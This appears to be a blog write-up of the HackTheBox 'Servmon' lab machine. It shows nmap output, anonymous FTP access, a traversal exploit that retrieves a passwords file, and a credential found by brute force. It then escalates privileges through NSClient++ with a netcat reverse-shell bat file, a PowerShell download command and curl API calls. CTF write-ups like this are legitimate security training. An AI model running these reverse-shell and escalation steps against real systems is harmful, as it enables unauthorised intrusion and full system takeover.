---
date: 2020-06-20 23:48:05
layout: post
title: HackTheBox Servmon Writeup
subtitle: Hackthebox Servmon Writeup.
description: >-
  in this blog i've explained how to solve Servmon machine in hackthebox
image: https://i.ibb.co/YTqbHBZ/page.png
optimized_image: https://i.ibb.co/YTqbHBZ/page.png
category: hackthebox
tags:
  - hackthebox
  - Servmon
author: Ahmed Fatouh
paginate: true
---


# []()Methodlogy:

1. nmap scan
2. ftp enumeration
3. cms exploitation
4. brute-force
5. port forwarding
6. privilege escalation


# []()Nmap

> as always, i did nmap scan to find out which servicecs was running in this machine and the important thing that i found Port **8443** was opened and this is a good point to start.
>

> nmap -sC -sV -Pn -oN scan.txt 10.10.10.184

```ruby

  PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
5666/tcp open  tcpwrapped
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/14%Time=5E957C86%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\xc9f\xe9O\0\x96\0\x80\0\
SF:0\0\0")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n
SF:\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404
SF:\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPReque
SF:st,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not
SF:\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\
SF:r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

```
# []()Checking The Web Page:

> after opening the web page i found that this is a **NVMS-1000** CMS. 
>
> NVMS-1000 is a monitoring client which is specially designed for network video surveillance.

![WebPage](https://i.ibb.co/ZxvjT3j/webpage.png)

> now i open exploitdb and searched for any exploits for this cms and if found this [exploit](https://www.exploit-db.com/exploits/47774)

* lets run the expliot.

![exp](https://i.ibb.co/0hxBzFp/burp.png)

* Great!

> now we have the exploit, but i did an mistake here and i know that after did some enum with the exploit and didn't get anything, so i know that i forgot to do nmap scan for all ports and this is our point.

> nmap -p- -o all.txt 10.10.10.184

```ruby
  
 Not shown: 65516 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
7680/tcp  open  pando-pub
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

```

* great we have an open port for ftp, let's go to enum it.

# []()FTP Enumeration

* User-Name: **Anonymous**
* Password: **Anonymous**

> ![](https://i.ibb.co/FJG0KfX/ftp.gif)

> Anonymous Logged in successfully completed.

> i got 2 files from the ftp.

> Confidential.txt and this contain some useful information.

```ruby

Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine

```

> from this note we know that there is a Passwords file in Nathan Desktop so let's get it with our exploit.

> ![](https://i.ibb.co/wpnnKhB/passwords.png)

> nice! we have the passwords now, let's do brute force attack To find out which of these passwords belong to the users we know.

# []()Brute-Force

> ![done](https://i.ibb.co/JnnWrZr/nadine.gif)

> nice!, we have the user and his password now.

* user: **Nadine**
* password: **L1k3B1gBut7s@W0rk**

# []()User-Flag:

> login via ssh with the credentials we have.

> ![User](https://i.ibb.co/1z3b5x6/user.gif)

# []()Privilege-Escalation

> after some eumeration i've found that there an NSClient++ installed in this machine.

```ruby

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

```

> we will use this exploit [exploit](https://www.exploit-db.com/exploits/46802)

> first thing we have to grap the web administrator password.

> open c:\program files\nsclient++\nsclient.ini, 

> - or run the following that is instructed when you select forget password

> C:\Program Files\NSClient++>nscp web -- password --display

> ![WebCreds](https://i.ibb.co/h15rwZf/web.gif)

> now the seconed part we need to open the web page of the nscclient bur it was running in the localhost only so we have to do Port Forwarding.

> ![nsclient](https://i.ibb.co/SdMxsdp/we.png)

> Port-Forwarding: ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184

> ![](https://i.ibb.co/P1ZD9Zp/nsc.png)

> now we need to make an evil bat file and add it to the queries and run it to get reverse shell as system admin.

> i didn't use the gui beacause it's very laggy, so i will use the  command line and this is a Documentation for it.[Docs](https://docs.nsclient.org/api/rest/scripts/#add-script),[Docs2](https://docs.nsclient.org/api/rest/queries/#command-execute)
>

> now we have everything we want, so let's go.

> first we need to make a bat file with this content

```ruby

@echo off
	c:\temp\nc.exe 10.10.xx.xx 4444 -e cmd.exe
  
  ```
  
  > and we need to upload it and upload nc.exe to the machine.
  
  > command to upload files : powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
  
  - now we uploaded the evil.bat and the nc so let me tell you the commands i used:

> curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/rev.bat --data-binary @hey.bat

> curl -s -k -u admin https://localhost:8443/api/v1/scripts/ext/scripts/rev.bat

> curl -s -k -u admin https://localhost:8443/api/v1/queries/rev
	
> curl -s -k -u admin https://localhost:8443/api/v1/queries/scripts\rev.bat

> curl -s -k -u admin "https://localhost:8443/api/v1/queries/rev/commands/execute?time=3m"

- let's go

# []()Root-Flag

![Root](https://i.ibb.co/sqBcMGY/root.gif)

> d0ne!.

> Walkthrough
>
> [![Video](https://i.ibb.co/YTqbHBZ/page.png)](https://www.youtube.com/watch?v=ZhsPAguz4-Y)


- Thanks for reading.

 <script src="https://www.hackthebox.eu/badge/103789"></script>

	


